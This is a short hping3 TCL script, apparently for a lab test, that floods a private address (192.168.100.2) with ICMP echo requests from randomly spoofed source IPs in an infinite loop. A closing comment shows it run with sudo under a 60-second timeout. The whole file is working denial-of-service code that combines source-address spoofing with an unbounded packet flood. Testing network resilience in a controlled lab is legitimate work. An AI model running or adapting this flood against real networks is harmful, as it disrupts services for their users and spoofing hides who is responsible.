# Hping3 Echo Flood with TCL script
# ICMP Echo-Request Flood (rand source, ttl=64, payload=0) for hping3 TCL mode

set dst_ip "192.168.100.2"

# Função para gerar IP randômico
proc random_ip {} {
    return "[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}]"
}

while {1} {
    set saddr [random_ip]
    # Pacote ICMP Echo Request (type 8, code 0), TTL=64, payload vazio
    set pkt "ip(saddr=$saddr,daddr=$dst_ip,ttl=64)+icmp(type=8,code=0)"
    hping send $pkt
}

# sudo timeout -s INT 60 hping3 exec hping3_test_icmp_echo_flood_TCL.htcl